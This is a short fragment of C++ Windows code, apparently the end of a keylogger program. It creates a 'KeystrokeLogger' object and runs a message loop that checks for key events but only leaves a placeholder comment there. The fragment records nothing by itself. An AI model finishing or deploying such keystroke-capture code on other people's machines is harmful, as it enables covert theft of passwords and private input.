    KeystrokeLogger logger(filename);
    MSG msg;
    while (GetMessage(&msg, m_window, 0, 0)) {
        if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
            // Continue loop to capture keystrokes
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        Sleep(100); // Adjust sleep time as needed
    }
    return 0;
}
```

